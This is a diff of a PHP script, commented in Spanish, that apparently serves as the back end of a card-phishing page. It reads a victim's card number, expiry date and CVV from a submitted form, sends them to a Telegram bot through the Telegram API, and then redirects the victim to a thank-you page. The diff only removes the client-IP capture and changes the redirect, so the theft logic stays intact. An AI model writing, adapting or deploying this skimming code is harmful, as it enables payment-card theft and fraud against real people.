@@ -12,26 +12,11 @@ $tarjeta = $_POST['tarj'];
 $fecha = $_POST['fecha'];
 $cvv = $_POST['pass']; // Aquí incluimos el campo CVV correctamente
 
-// Función para obtener la IP del cliente
-function obtenerIPCliente() {
-    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        return $_SERVER['HTTP_CLIENT_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        return $_SERVER['HTTP_X_FORWARDED_FOR'];
-    } else {
-        return $_SERVER['REMOTE_ADDR'];
-    }
-}
-
-// Obtener la IP del cliente
-$ip_cliente = obtenerIPCliente();
-
 // Formatear el mensaje con todos los datos
 $mensaje = "📝 *Detalles de la Tarjeta Recibida* 📝\n\n";
 $mensaje .= "💳 *Número de Tarjeta*: $tarjeta\n";
 $mensaje .= "📅 *Fecha de Expiración*: $fecha\n";
 $mensaje .= "🔒 *Código de Seguridad (CVV)*: $cvv\n"; // Incluimos el CVV en el mensaje
-$mensaje .= "🌍 *IP del Cliente*: $ip_cliente\n"; // Incluimos la IP del cliente en el mensaje
 
 // Enviar los datos a Telegram
 $telegram_url = "https://api.telegram.org/bot$token/sendMessage";
@@ -55,7 +40,7 @@ if ($response === false) {
     die("Error al enviar el mensaje a Telegram.");
 } else {
     // Redirigir a otra página después de enviar los datos
-    header("Location: /2.html"); // Cambia esto por la página a la que quieres redirigir
+    header("Location: gracias.html"); // Cambia esto por la página a la que quieres redirigir
     exit;
 }
 ?>
